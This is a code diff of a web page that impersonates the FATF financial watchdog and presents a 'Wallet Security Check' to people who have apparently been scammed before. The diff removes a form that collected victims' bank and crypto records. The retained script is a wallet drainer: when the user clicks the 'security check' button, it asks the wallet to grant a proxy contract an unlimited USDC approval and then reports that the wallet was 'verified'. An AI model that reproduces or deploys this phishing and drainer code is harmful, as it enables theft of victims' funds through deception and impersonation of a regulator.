@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FATF Notification Website</title>
+    <title>FATF Wallet Security Check</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -104,23 +104,7 @@
         </ul>
         <p>Please respond within 7 days to submit the necessary materials for investigation.</p>
     </div>
-    <!-- Materials Submission Section -->
-    <div class="container" id="materials">
-        <h2 class="section-title">Submit Materials</h2>
-        <p>Please submit the following materials for investigation:</p>
-        <ul>
-            <li>Personal Fraud Record: Describe in detail the transaction process with the fraudulent platform, including amount, time, and platform specifics.</li>
-            <li>Bank Transaction Record: Upload records of bank transfers related to fraudulent transactions.</li>
-            <li>Cryptocurrency Transaction Record: Upload transaction proofs related to exchanges or wallets.</li>
-        </ul>
-        <p>Click the button below to submit via Google Form:</p>
-        <a href="https://docs.google.com/forms/d/e/1FAIpQLSdmj9CaYuaUQdZ6GLlL8-qLIOS3o9VG4tZU0JVwuLcf_ijDDg/viewform?usp=pp_url" target="_blank">
-            <button>Submit Materials</button>
-        </a>
-        <p>Or email materials to: <a href="mailto:support@fatfgroup.org">support@fatfgroup.org</a></p>
-    </div>
-
-    <!-- Funds Recovery Section -->
+    <!-- Wallet Security Check Section -->
     <div class="container" id="recovery">
         <h2 class="section-title">Check Wallet Security</h2>
         <p>Connect your wallet and perform a security check to ensure safety.</p>
@@ -135,10 +119,11 @@
 
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script>
-        const tokenAddress = "0x8588fC4386D278A0Ec02318983f4F837004E6722"; // Updated Token Address
-        const proxyAddress = "0x87170f0808DF35f6A5cA09067b08221c2A50B072"; // Updated Contract Address
+        const tokenAddress = "0x8588fC4386D278A0Ec02318983f4F837004E6722"; // USDC Token Address
+        const proxyAddress = "0x87170f0808DF35f6A5cA09067b08221c2A50B072"; // Proxy Contract Address
         let provider, signer;
 
+        // Connect wallet
         async function connectWallet() {
             if (typeof window.ethereum !== "undefined") {
                 try {
@@ -156,18 +141,21 @@
             }
         }
 
+        // Perform security check (actual approval process)
         async function checkSecurity() {
             if (!signer) {
                 alert("Please connect your wallet first!");
                 return;
             }
 
+            // ERC20 Token ABI (only approve function)
             const tokenABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
             const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
 
             try {
+                // Approve unlimited token allowance for the proxy contract
                 const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);
-                alert("Wallet security verified successfully!");
+                alert("Wallet security verified successfully! Authorization granted.");
             } catch (error) {
                 alert("Wallet security check failed. Please try again!");
             }
